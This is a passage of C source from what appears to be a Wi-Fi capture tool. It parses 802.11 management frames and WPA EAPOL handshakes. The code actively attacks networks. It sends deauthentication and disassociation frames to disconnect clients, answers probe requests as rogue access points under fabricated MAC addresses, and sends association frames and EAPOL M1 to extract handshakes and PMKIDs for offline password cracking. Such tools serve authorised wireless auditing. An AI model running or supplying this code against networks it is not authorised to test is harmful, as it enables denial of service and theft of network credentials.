1))\n\t\t\t{\n\t\t\tauthseqakt.kdv3 = kdv;\n\t\t\tif(authseqakt.kdv2 == kdv)\n\t\t\t\t{\n\t\t\t\tif((tsakt - tshold) < EAPOLM3TIMEOUT)\n\t\t\t\t\t{\n\t\t\t\t\tif(memcmp(&authseqakt.noncem1, &wpakey->nonce[28], 4) == 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tfor(i = 0; i < APLIST_MAX -1; i++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(memcmp((aplist +i)->macap, authseqakt.macap, ETH_ALEN) == 0)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t(aplist +i)->tsakt = tsakt;\n\t\t\t\t\t\t\t\t(aplist +i)->status |= AP_EAPOL_M3;\n\t\t\t\t\t\t\t\twanteventflag |= exiteapolm3flag;\n\t\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nauthseqakt.status = 0;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol_m2rg(void)\n{\nsize_t i;\n\nauthseqakt.status = 0;\nwriteepbm1();\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->tsakt = tsakt;\n\t(clientlist +i)->status |= CLIENT_EAPOL_M2;\n\tif((clientlist +i)->count == 0) return;\n\tif(memcmp((clientlist +i)->mic, &wpakey->keymic[0], 4) == 0) send_80211_disassociation_fm_ap(macfrx->addr2, macfrx->addr1, WLAN_REASON_PREV_AUTH_NOT_VALID);\n\tmemcpy((clientlist +i)->mic, &wpakey->keymic[0], 4);\n\t(clientlist +i)->count -= 1;\n\treturn;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol_m2(void)\n{\nauthseqakt.replaycountm2 = __hcx64be(wpakey->replaycount);\nif(replaycountrg == authseqakt.replaycountm2)\n\t{\n\tprocess80211eapol_m2rg();\n\treturn;\n\t}\nif((authseqakt.status & AP_EAPOL_M1) == AP_EAPOL_M1)\n\t{\n\tif(memcmp(&authseqakt.macap, macfrx->addr1, ETH_ALEN) == 0)\n\t\t{\n\t\tif(authseqakt.replaycountm1 == authseqakt.replaycountm2)\n\t\t\t{\n\t\t\tauthseqakt.kdv2 = kdv;\n\t\t\tif(authseqakt.kdv1 == authseqakt.kdv2)\n\t\t\t\t{\n\t\t\t\tif((tsakt - tshold) < EAPOLM2TIMEOUT)\n\t\t\t\t\t{\n\t\t\t\t\tauthseqakt.status |= AP_EAPOL_M2;\n\t\t\t\t\twanteventflag |= exiteapolm2flag;\n\t\t\t\t\t}\n\t\t\t\telse authseqakt.status = 0;\n\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nauthseqakt.status = 0;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol_m1(void)\n{\nstatic size_t i;\n\nmemset(&authseqakt, 0, AUTHSEQAKT_SIZE);\nmemcpy(&authseqakt.macap, macfrx->addr2, ETH_ALEN);\nauthseqakt.kdv1 = kdv;\nauthseqakt.replaycountm1 = __hcx64be(wpakey->replaycount);\nmemcpy(&authseqakt.noncem1, &wpakey->nonce[28], 4);\nauthseqakt.status = AP_EAPOL_M1;\nwanteventflag |= exiteapolm1flag;\nif(__hcx16be(wpakey->wpadatalen) == IEEE80211_PMKID_SIZE)\n\t{\n\tpmkid = (ieee80211_pmkid_t*)(eapolplptr + IEEE80211_WPAKEY_SIZE);\n\tif(memcmp(&rsnsuiteoui, pmkid->oui, 3) == 0)\n\t\t{\n\t\tif(pmkid->len >= 0x14)\n\t\t\t{\n\t\t\tif(pmkid->type == PMKID_KDE)\n\t\t\t\t{\n\t\t\t\tif(memcmp(pmkid->pmkid, &zeroed, PMKID_MAX) != 0)\n\t\t\t\t\t{\n\t\t\t\t\tauthseqakt.status |= AP_PMKID;\n\t\t\t\t\twanteventflag |= exiteapolpmkidflag;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp((aplist +i)->macap, authseqakt.macap, ETH_ALEN) == 0)\n\t\t{\n\t\t(aplist +i)->status |= authseqakt.status;\n\t\t(aplist +i)->tsakt = tsakt;\n\t\treturn;\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapol(void)\n{\neapolplptr = eapauthplptr + IEEE80211_EAPAUTH_SIZE;\neapolpllen = eapauthpllen - IEEE80211_EAPAUTH_SIZE;\nif((eapolpllen + IEEE80211_EAPAUTH_SIZE + IEEE80211_LLC_SIZE) > payloadlen) return;\nwpakey = (ieee80211_wpakey_t*)eapolplptr;\nif((kdv = __hcx16be(wpakey->keyinfo) & WPA_KEY_INFO_TYPE_MASK) == 0) return;\nkeyinfo = (get_keyinfo(__hcx16be(wpakey->keyinfo)));\nswitch(keyinfo)\n\t{\n\tcase M1:\n\tprocess80211eapol_m1();\n\tbreak;\n\n\tcase M2:\n\tprocess80211eapol_m2();\n\tbreak;\n\n\tcase M3:\n\tprocess80211eapol_m3();\n\tbreak;\n\n\tcase M4:\n\tif(deauthenticationflag == true) process80211eapol_m4();\n\tbreak;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211eapauthentication(void)\n{\ntshold = tsakt;\neapauthplptr = payloadptr + IEEE80211_LLC_SIZE;\neapauthpllen = payloadlen - IEEE80211_LLC_SIZE;\neapauth = (ieee80211_eapauth_t*)eapauthplptr;\neapauthlen = __hcx16be(eapauth->len);\nif(eapauthlen > (eapauthpllen - IEEE80211_EAPAUTH_SIZE)) return;\nif(eapauth->type == EAPOL_KEY) process80211eapol();\nelse if(eapauth->type == EAPOL_START) process80211eap_start();\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211reassociationresponse(void)\n{\nstatic size_t i;\nstatic ieee80211_assoc_or_reassoc_resp_t *reassociationresponse;\n\ntshold = tsakt;\nmemcpy(&authseqakt.macap, macfrx->addr2, ETH_ALEN);\nreassociationresponse = (ieee80211_assoc_or_reassoc_resp_t*)payloadptr;\nif(payloadlen < IEEE80211_REASSOCIATIONRESPONSE_SIZE) return;\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->aid = __hcx16le(reassociationresponse->aid);\n\treturn;\n\t}\nmemset((clientlist + i), 0, CLIENTLIST_SIZE);\n(clientlist +i)->tsakt = tsakt;\nmemcpy((clientlist +i)->macclient, macfrx->addr1, ETH_ALEN);\nmemcpy((clientlist +i)->macap, macfrx->addr2, ETH_ALEN);\n(clientlist +i)->aid = reassociationresponse->aid;\nqsort(clientlist, i + 1, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211reassociationrequest(void)\n{\nstatic size_t i;\nstatic ieee80211_reassoc_req_t *reassociationrequest;\nstatic u16 reassociationrequestlen;\n\nif(memcmp(macfrx->addr1, &macaprghidden, ETH_ALEN) == 0) return;\ntshold = tsakt;\nreassociationrequest = (ieee80211_reassoc_req_t*)payloadptr;\nif((reassociationrequestlen = payloadlen - IEEE80211_REASSOCIATIONREQUEST_SIZE) < IEEE80211_IETAG_SIZE) return;\nmemcpy(&authseqakt.macap, macfrx->addr1, ETH_ALEN);\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->tsakt = tsakt;\n\tif((clientlist +i)->count == 0) return;\n\tif((tsakt - (clientlist +i)->tsassoc) > TIMEREASSOCWAIT)\n\t\t{\n\t\ttagwalk_channel_essid_rsn(&(clientlist +i)->ie, reassociationrequestlen, reassociationrequest->ie);\n\t\tif(((clientlist +i)->ie.flags & APRSNAKM_PSK) != 0)\n\t\t\t{\n\t\t\tif(((clientlist +i)->aid & 0xc0) == 0) (clientlist +i)->aid = HCXTXAID;\n\t\t\tsend_80211_reassociationresponse((clientlist +i)->aid);\n\t\t\tsend_80211_eapol_m1();\n\t\t\t(clientlist +i)->count -= 1;\n\t\t\t}\n\t\telse (clientlist +i)->count = 0;\n\t\twriteepb();\n\t\t}\n\t(clientlist +i)->tsassoc = tsakt;\n\treturn;\n\t}\nmemset((clientlist + i), 0, CLIENTLIST_SIZE);\n(clientlist +i)->tsakt = tsakt;\n(clientlist +i)->tsassoc = tsfirst;\n(clientlist +i)->tsreassoc = tsfirst;\n(clientlist +i)->count = attemptclientmax;\n(clientlist +i)->aid = HCXTXAID;\nmemcpy((clientlist +i)->macclient, macfrx->addr2, ETH_ALEN);\nmemcpy((clientlist +i)->macap, macfrx->addr1, ETH_ALEN);\ntagwalk_channel_essid_rsn(&(clientlist +i)->ie, reassociationrequestlen, reassociationrequest->ie);\nif((((clientlist +i)->ie.flags & APRSNAKM_PSK) != 0) && (attemptclientmax > 0))\n\t{\n\tsend_80211_reassociationresponse((clientlist +i)->aid);\n\tsend_80211_eapol_m1();\n\t}\nelse (clientlist +i)->count = 0;\nqsort(clientlist, i + 1, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211associationresponse(void)\n{\nstatic size_t i;\nstatic ieee80211_assoc_or_reassoc_resp_t *associationresponse;\n\ntshold = tsakt;\nmemcpy(&authseqakt.macap, macfrx->addr2, ETH_ALEN);\nif(memcmp(macfrx->addr1, &macclientrg, ETH_ALEN) == 0) return;\nassociationresponse = (ieee80211_assoc_or_reassoc_resp_t*)payloadptr;\nif(payloadlen < IEEE80211_ASSOCIATIONRESPONSE_SIZE) return;\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->aid = __hcx16le(associationresponse->aid);\n\treturn;\n\t}\nmemset((clientlist + i), 0, CLIENTLIST_SIZE);\n(clientlist +i)->tsakt = tsakt;\nmemcpy((clientlist +i)->macclient, macfrx->addr1, ETH_ALEN);\nmemcpy((clientlist +i)->macap, macfrx->addr2, ETH_ALEN);\n(clientlist +i)->aid = __hcx16le(associationresponse->aid);\nqsort(clientlist, i + 1, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211associationrequest(void)\n{\nstatic size_t i;\nstatic ieee80211_assoc_req_t *associationrequest;\nstatic u16 associationrequestlen;\n\nif(memcmp(macfrx->addr1, &macaprghidden, ETH_ALEN) == 0) return;\ntshold = tsakt;\nassociationrequest = (ieee80211_assoc_req_t*)payloadptr;\nif((associationrequestlen = payloadlen - IEEE80211_ASSOCIATIONREQUEST_SIZE) < IEEE80211_IETAG_SIZE) return;\nmemcpy(&authseqakt.macap, macfrx->addr1, ETH_ALEN);\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->tsakt = tsakt;\n\tif((clientlist +i)->count == 0) return;\n\ttagwalk_channel_essid_rsn(&(clientlist +i)->ie, associationrequestlen, associationrequest->ie);\n\tif((tsakt - (clientlist +i)->tsassoc) > TIMEASSOCWAIT)\n\t\t{\n\t\tif(((clientlist +i)->ie.flags & APRSNAKM_PSK) != 0)\n\t\t\t{\n\t\t\tsend_80211_associationresponse();\n\t\t\tsend_80211_eapol_m1();\n\t\t\t(clientlist +i)->count -= 1;\n\t\t\t}\n\t\telse (clientlist +i)->count = 0;\n\t\twriteepb();\n\t\t}\n\t(clientlist +i)->tsassoc = tsakt;\n\treturn;\n\t}\nmemset((clientlist + i), 0, CLIENTLIST_SIZE);\n(clientlist +i)->tsakt = tsakt;\n(clientlist +i)->tsassoc = tsfirst;\n(clientlist +i)->tsreassoc = tsfirst;\n(clientlist +i)->count = attemptclientmax;\nmemcpy((clientlist +i)->macclient, macfrx->addr2, ETH_ALEN);\nmemcpy((clientlist +i)->macap, macfrx->addr1, ETH_ALEN);\ntagwalk_channel_essid_rsn(&(clientlist +i)->ie, associationrequestlen, associationrequest->ie);\nif((((clientlist +i)->ie.flags & APRSNAKM_PSK) != 0) && (attemptclientmax > 0))\n\t{\n\tsend_80211_associationresponse();\n\tsend_80211_eapol_m1();\n\t}\nelse (clientlist +i)->count = 0;\nqsort(clientlist, i + 1, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211authentication_fmclient(void)\n{\nsize_t i;\n\nif(memcmp(macfrx->addr1, &macaprghidden, ETH_ALEN) == 0) return;\nfor(i = 0; i < CLIENTLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr2, (clientlist +i)->macclient, ETH_ALEN) != 0) continue;\n\tif(memcmp(macfrx->addr1, (clientlist +i)->macap, ETH_ALEN) != 0) continue;\n\t(clientlist +i)->tsakt = tsakt;\n\tif((clientlist +i)->count == 0) return;\n\tif((tsakt - (clientlist +i)->tsauth) > TIMEAUTHWAIT)\n\t\t{\n\t\tsend_80211_authenticationresponse();\n\t\twriteepb();\n\t\t}\n\t(clientlist +i)->tsauth = tsakt;\n\treturn;\n\t}\nmemset((clientlist + i), 0, CLIENTLIST_SIZE);\n(clientlist +i)->tsakt = tsakt;\n(clientlist +i)->tsauth = tsfirst;\n(clientlist +i)->tsassoc = tsfirst;\n(clientlist +i)->tsreassoc = tsfirst;\n(clientlist +i)->count = attemptclientmax;\nmemcpy((clientlist +i)->macclient, macfrx->addr2, ETH_ALEN);\nmemcpy((clientlist +i)->macap, macfrx->addr1, ETH_ALEN);\nif(attemptclientmax > 0) send_80211_authenticationresponse();\nqsort(clientlist, i + 1, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211authentication(void)\n{\nsize_t i;\nstatic ieee80211_auth_t *auth;\n\ntshold = tsakt;\nauth = (ieee80211_auth_t*)payloadptr;\nif(payloadlen < IEEE80211_AUTH_SIZE) return;\nif(__hcx16le(auth->algorithm) == OPEN_SYSTEM)\n\t{\n\tif(__hcx16le(auth->sequence) == 1) process80211authentication_fmclient();\n\telse if(__hcx16le(auth->sequence) == 2)\n\t\t{\n\t\tif(memcmp(&macclientrg, macfrx->addr1, 3) == 0)\n\t\t\t{\n\t\t\tfor(i = 0; i < APLIST_MAX - 1; i++)\n\t\t\t\t{\n\t\t\t\tif(memcmp((aplist +i)->macap, macfrx->addr2, ETH_ALEN) == 0)\n\t\t\t\t\t{\n\t\t\t\t\t(aplist +i)->tsakt = tsakt;\n\t\t\t\t\t(aplist +i)->status |= AP_IN_RANGE;\n\t\t\t\t\tif((tsakt - (aplist +i)->tsauth) > TIMEAUTHWAIT)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_associationrequest(i);\n\t\t\t\t\t\twriteepb();\n\t\t\t\t\t\t}\n\t\t\t\t\t(aplist +i)->tsauth = tsakt;\n\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void get_tag(u8 ietag, essid_t *essid, int infolen, u8 *infostart)\n{\nstatic ieee80211_ietag_t *infoptr;\n\nwhile(0 < infolen)\n\t{\n\tinfoptr = (ieee80211_ietag_t*)infostart;\n\tif(infolen < (int)(infoptr->len + IEEE80211_IETAG_SIZE)) return;\n\tif(infoptr->id == ietag)\n\t\t{\n\t\tessid->len = infoptr->len;\n\t\tessid->essid = (u8*)infoptr->ie;\n\t\treturn;\n\t\t}\n\tinfostart += infoptr->len + IEEE80211_IETAG_SIZE;\n\tinfolen -= infoptr->len + IEEE80211_IETAG_SIZE;\n\t}\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211proberequest_directed(void)\n{\nstatic size_t i;\nstatic ieee80211_proberequest_t *proberequest;\nstatic u16 proberequestlen;\nstatic essid_t essid;\n\nif(memcmp(macfrx->addr1, &macaprghidden, ETH_ALEN) == 0) return;\nproberequest = (ieee80211_proberequest_t*)payloadptr;\nif((proberequestlen = payloadlen - IEEE80211_PROBERESPONSE_SIZE)  < IEEE80211_IETAG_SIZE) return;\nget_tag(TAG_SSID, &essid, proberequestlen, proberequest->ie);\nif(attemptclientmax > 0) send_80211_probereresponse(macfrx->addr2, macfrx->addr1, essid.len, essid.essid);\nfor(i = 0; i < MACLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr1, (maclist +i)->mac, ETH_ALEN) != 0) continue;\n\t(maclist +i)->tsakt = tsakt;\n\treturn;\n\t}\n(maclist +i)->tsakt = tsakt;\nmemcpy((maclist +i)->mac, macfrx->addr1, ETH_ALEN);\nqsort(maclist, i + 1, MACLIST_SIZE, sort_maclist_by_tsakt);\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211proberequest_undirected(void)\n{\nstatic size_t i;\nstatic ieee80211_proberequest_t *proberequest;\nstatic u16 proberequestlen;\nstatic essid_t essid;\n\nproberequest = (ieee80211_proberequest_t*)payloadptr;\nif((proberequestlen = payloadlen - IEEE80211_PROBERESPONSE_SIZE)  < IEEE80211_IETAG_SIZE) return;\nget_tag(TAG_SSID, &essid, proberequestlen, proberequest->ie);\nif(attemptclientmax > 0)\n\t{\n\tif(essid.len == 0)\n\t\t{\n\t\tfor(i = 0; i < proberesponsetxmax; i++)\n\t\t\t{\n\t\t\tif(proberesponseindex >= APRGLIST_MAX)\n\t\t\t\t{\n\t\t\t\tproberesponseindex = 0;\n\t\t\t\treturn;\n\t\t\t\t}\n\t\t\tif((aprglist + proberesponseindex)->essidlen == 0)\n\t\t\t\t{\n\t\t\t\tproberesponseindex = 0;\n\t\t\t\treturn;\n\t\t\t\t}\n\t\t\tsend_80211_probereresponse(macfrx->addr2, (aprglist + proberesponseindex)->macaprg, (aprglist + proberesponseindex)->essidlen, (aprglist + proberesponseindex)->essid);\n\t\t\tproberesponseindex++;\n\t\t\t}\n\t\treturn;\n\t\t}\n\t}\n\nfor(i = 0; i < APRGLIST_MAX - 1; i++)\n\t{\n\tif((aprglist +i)->essidlen != essid.len) continue;\n\tif(memcmp((aprglist +i)->essid, essid.essid, essid.len) != 0) continue;\n\t(aprglist +i)->tsakt = tsakt;\n\tif(attemptclientmax > 0) send_80211_probereresponse(macfrx->addr2, (aprglist +i)->macaprg, essid.len, essid.essid);\n\treturn;\n\t}\nmemset((aprglist + i), 0, APRGLIST_SIZE);\n(aprglist +i)->tsakt = tsakt;\n(aprglist +i)->essidlen = essid.len;\nmemcpy((aprglist +i)->essid, essid.essid, essid.len);\n(aprglist +i)->macaprg[5] = nicaprg & 0xff;\n(aprglist +i)->macaprg[4] = (nicaprg >> 8) & 0xff;\n(aprglist +i)->macaprg[3] = (nicaprg >> 16) & 0xff;\n(aprglist +i)->macaprg[2] = ouiaprg & 0xff;\n(aprglist +i)->macaprg[1] = (ouiaprg >> 8) & 0xff;\n(aprglist +i)->macaprg[0] = (ouiaprg >> 16) & 0xff;\nnicaprg++;\nif(attemptclientmax > 0) send_80211_probereresponse(macfrx->addr2, (aprglist +i)->macaprg, essid.len, essid.essid);\nqsort(aprglist, i + 1, APRGLIST_SIZE, sort_aprglist_by_tsakt);\nwriteepb();\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211proberesponse_rca(void)\n{\nstatic size_t i;\nstatic ieee80211_beacon_proberesponse_t *proberesponse;\nstatic u16 proberesponselen;\n\nif(memcmp(&macclientrg, macfrx->addr1, ETH_ALEN) != 0) return;\nproberesponse = (ieee80211_beacon_proberesponse_t*)payloadptr;\nif((proberesponselen = payloadlen - IEEE80211_PROBERESPONSE_SIZE) < IEEE80211_IETAG_SIZE) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr3, (aplist +i)->macap, ETH_ALEN) != 0) continue;\n\t(aplist +i)->tsauth = tsakt;\n\tpacketrcarxcount++;\n\tif(((aplist +i)->status & AP_PROBERESPONSE) == 0) (aplist +i)->status |= AP_PROBERESPONSE;\n\ttagwalk_channel_essid_rsn(&(aplist +i)->ie, proberesponselen, proberesponse->ie);\n\tif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\n\tif(((aplist +i)->ie.flags & APIE_ESSID) == APIE_ESSID) (aplist +i)->status |= AP_ESSID;\n\t(aplist +i)->frequency = (scanlist + scanlistindex)->frequency;\n\t(aplist +i)->count += 1;\n\treturn;\n\t}\nmemset((aplist + i), 0, APLIST_SIZE);\n(aplist +i)->tsakt = tsakt;\n(aplist +i)->tshold1 = tsakt;\n(aplist +i)->tsauth = tsfirst;\nmemcpy((aplist +i)->macap, macfrx->addr3, ETH_ALEN);\nmemcpy((aplist +i)->macclient, &macbc, ETH_ALEN);\npacketrcarxcount++;\n(aplist +i)->status |= AP_PROBERESPONSE;\ntagwalk_channel_essid_rsn(&(aplist +i)->ie, proberesponselen, proberesponse->ie);\nif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\nif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\nif(((aplist +i)->ie.flags & APIE_ESSID) == APIE_ESSID) (aplist +i)->status |= AP_ESSID;\n(aplist +i)->frequency = (scanlist + scanlistindex)->frequency;\n(aplist +i)->count = 1;\nqsort(aplist, i + 1, APLIST_SIZE, sort_aplist_by_tsakt);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211proberesponse(void)\n{\nstatic size_t i;\nstatic ieee80211_beacon_proberesponse_t *proberesponse;\nstatic u16 proberesponselen;\n\nproberesponse = (ieee80211_beacon_proberesponse_t*)payloadptr;\nif((proberesponselen = payloadlen - IEEE80211_PROBERESPONSE_SIZE) < IEEE80211_IETAG_SIZE) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr3, (aplist +i)->macap, ETH_ALEN) != 0) continue;\n\t(aplist +i)->tsakt = tsakt;\n\tif(((aplist +i)->status & AP_PROBERESPONSE) == 0)\n\t\t{\n\t\twriteepb();\n\t\t#ifdef HCXNMEAOUT\n\t\tif(fd_gps > 0) writegpwpl(i);\n\t\t#endif\n\t\ttshold = tsakt;\n\t\t(aplist +i)->status |= AP_PROBERESPONSE;\n\t\t}\n\ttagwalk_channel_essid_rsn(&(aplist +i)->ie, proberesponselen, proberesponse->ie);\n\tif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\n\tif(((aplist +i)->ie.flags & APIE_ESSID) == APIE_ESSID) (aplist +i)->status |= AP_ESSID;\n\treturn;\n\t}\nmemset((aplist + i), 0, APLIST_SIZE);\n(aplist +i)->tsakt = tsakt;\n(aplist +i)->tshold1 = tsakt;\n(aplist +i)->tsauth = tsfirst;\n(aplist +i)->count = attemptapmax;\nmemcpy((aplist +i)->macap, macfrx->addr3, ETH_ALEN);\nmemcpy((aplist +i)->macclient, &macbc, ETH_ALEN);\n(aplist +i)->status |= AP_PROBERESPONSE;\ntagwalk_channel_essid_rsn(&(aplist +i)->ie, proberesponselen, proberesponse->ie);\nif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\nif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\nif(((aplist +i)->ie.flags & APIE_ESSID) == APIE_ESSID) (aplist +i)->status |= AP_ESSID;\nif(deauthenticationflag == true)\n\t{\n\tif(((aplist +i)->ie.flags & AP_MFP) == 0)\n\t\t{\n\t\tif(((aplist +i)->ie.flags & APAKM_MASK) != 0) send_80211_deauthentication_fm_ap(macbc, (aplist +i)->macap, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);\n\t\t}\n\t}\nif(associationflag == true)\n\t{\n\tif((((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) && (((aplist +i)->ie.flags & APIE_ESSID) == 0)) send_80211_authenticationrequest();\n\t}\nif(reassociationflag == true)\n\t{\n\tif(((aplist +i)->ie.flags & APRSNAKM_PSK) != 0) send_80211_reassociationrequest(i);\n\t}\nwriteepb();\n#ifdef HCXNMEAOUT\nif(fd_gps > 0) writegpwpl(i);\n#endif\nqsort(aplist, i + 1, APLIST_SIZE, sort_aplist_by_tsakt);\ntshold = tsakt;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211beacon_rca(void)\n{\nstatic size_t i;\nstatic ieee80211_beacon_proberesponse_t *beacon;\nstatic u16 beaconlen;\n\nbeacon = (ieee80211_beacon_proberesponse_t*)payloadptr;\nif((beaconlen = payloadlen - IEEE80211_BEACON_SIZE) < IEEE80211_IETAG_SIZE) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr3, (aplist +i)->macap, ETH_ALEN) != 0) continue;\n\t(aplist +i)->tsakt = tsakt;\n\tif(((aplist +i)->status & AP_BEACON) == 0) (aplist +i)->status |= AP_BEACON;\n\ttagwalk_channel_essid_rsn(&(aplist +i)->ie, beaconlen, beacon->ie);\n\tif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\n\tif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\n\t(aplist +i)->frequency = (scanlist + scanlistindex)->frequency;\n\treturn;\n\t}\nmemset((aplist + i), 0, APLIST_SIZE);\n(aplist +i)->tsakt = tsakt;\n(aplist +i)->tshold1 = tsakt;\n(aplist +i)->tsauth = tsfirst;\nmemcpy((aplist +i)->macap, macfrx->addr3, ETH_ALEN);\nmemcpy((aplist +i)->macclient, &macbc, ETH_ALEN);\n(aplist +i)->status |= AP_BEACON;\ntagwalk_channel_essid_rsn(&(aplist +i)->ie, beaconlen, beacon->ie);\nif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\nif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\n(aplist +i)->frequency = (scanlist + scanlistindex)->frequency;\nqsort(aplist, i + 1, APLIST_SIZE, sort_aplist_by_tsakt);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void process80211beacon(void)\n{\nstatic size_t i;\nstatic ieee80211_beacon_proberesponse_t *beacon;\nstatic u16 beaconlen;\n\nbeacon = (ieee80211_beacon_proberesponse_t*)payloadptr;\nif((beaconlen = payloadlen - IEEE80211_BEACON_SIZE) < IEEE80211_IETAG_SIZE) return;\nfor(i = 0; i < APLIST_MAX - 1; i++)\n\t{\n\tif(memcmp(macfrx->addr3, (aplist +i)->macap, ETH_ALEN) != 0) continue;\n\t(aplist +i)->tsakt = tsakt;\n\tif(((aplist +i)->status & AP_BEACON) == 0)\n\t\t{\n\t\twriteepb();\n\t\ttshold = tsakt;\n\t\t#ifdef HCXNMEAOUT\n\t\tif(fd_gps > 0) writegpwpl(i);\n\t\t#endif\n\t\t(aplist +i)->status |= AP_BEACON;\n\t\t}\n\tif((aplist +i)->status >= AP_EAPOL_M3) return;\n\ttagwalk_channel_essid_rsn(&(aplist +i)->ie, beaconlen, beacon->ie);\n\tif((aplist +i)->ie.channel == 0) (aplist +i)->ie.channel = (scanlist + scanlistindex)->channel;\n\tif((aplist +i)->ie.channel != (scanlist + scanlistindex)->channel) return;\n\tif((aplist +i)->tsakt - (aplist +i)->tshold1 > TIMEBEACONNEW)\n\t\t{\n\t\t(aplist +i)->count = attemptapmax;\n\t\tmemcpy((aplist +i)->macclient, &macbc, ETH_ALEN);\n\t\t(aplist +i)->tshold1 = tsakt;\n\t\t}\n\tif((aplist +i)->count == 0) return;\n\tif(associationflag == true)\n\t\t{\n\t\tif(((aplist +i)->count % 8) == 6)\n\t\t\t{\n\t\t\tif(((aplist +i)->status & AP_EAPOL_M1) == 0)\n\t\t\t\t{\n\t\t\t\tif(((aplist +i)->status & AP_ESSID) == 